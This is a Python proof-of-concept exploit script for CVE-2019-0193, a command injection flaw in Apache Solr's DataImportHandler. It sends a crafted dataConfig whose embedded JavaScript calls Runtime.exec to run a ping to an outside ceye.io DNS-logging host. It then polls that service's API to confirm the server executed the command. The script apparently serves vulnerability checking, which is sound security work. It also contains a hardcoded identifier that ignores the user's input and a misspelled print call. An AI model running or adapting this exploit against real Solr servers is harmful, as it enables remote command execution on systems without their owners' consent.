#!/usr/bin/env python3
#@author: badger
#@date: 2019-10-20
#
import requests
import time
import sys

class PoC(object):
    name = "Apache Solr Command Injection"
    appName = "Apache Solr"
    appManu = "Apache Software Foundation"
    appVersion = "< 8.2.0"
    updateDate = "2019-10-20"
    Plateform = "Windows" # not sure
    vulRefer = "CVE-2019-0193"
    
    def __init__(self, host, port, identifier, token):
        self.host = str(host)
        self.port = str(port)
        self.cmd = "ping CVE-2019-0193.{}".format(identifier)
        self.token = token
        
    def _pushdata(self):
        veri_url = self.host + ':' + self.port + "/solr/atom/dataimport"
        headers = {"User-Agent": "Mozilla/5.0"}
        data = {"command": "full-import", "verbose": "false", "clean": "false", "commit": "true", "debug": "true", "core": "atom", "name": "dataimport", "dataConfig": 
                '<dataConfig>\
                <dataSource type="URLDataSource"/>\
                <script><![CDATA[\
                function poc(row){\
                var process= java.lang.Runtime.getRuntime();\
                process.exec("ping CVE-2019-0193.bb0585.ceye.io");\
                return row;\
                }\
                ]]></script>\
                <document>\
                <entity name="stackoverflow"\
                url="https://stackoverflow.com/feeds/tag/solr"\
                processor="XPathEntityProcessor"\
                forEach="/feed"\
                transformer="script:poc" />\
                </document>\
                </dataConfig>'}
        try:
            requests.post(url="https://"+veri_url, headers=headers, data=data, verify=False)
        except Exception as e:
            try:
                requests.post(url="http://"+veri_url, headers=headers, data=data, verify=False)
            except Exception as e:
                pirnt("Something went wrong.\nUsage: python CVE-2019-0193.py <host> <port> <ceye_identifier> <ceye_token>")

    def _check(self):
        self._pushdata()
        time.sleep(2)
        check_url = "http://api.ceye.io/v1/records?token={}&type=dns&filter=CVE-2019-0193".format(self.token)
        res = requests.get(url=check_url)
        if "CVE-2019-0193" in res.text:
            print("The target is vulnerable to {}.".format(self.vulRefer))
            return True
        else:
            print("The target seem not vulnerable to {}.".format(self.vulRefer))
            return False

if __name__ == '__main__':
    try:
        host = sys.argv[1]
        port = sys.argv[2]
        identifier = sys.argv[3]
        token = sys.argv[4]
    except Exception as e:
            print("Usage: python CVE-2019-0193.py <host> <port> <ceye_identifier> <ceye_token>")
            print("Example: python CVE-2019-0193.py localhost 8983 abcdef.ceye.io abcdefghijklmn")
            exit(-1)
    poc = PoC(host, port, identifier, token)
    poc._check()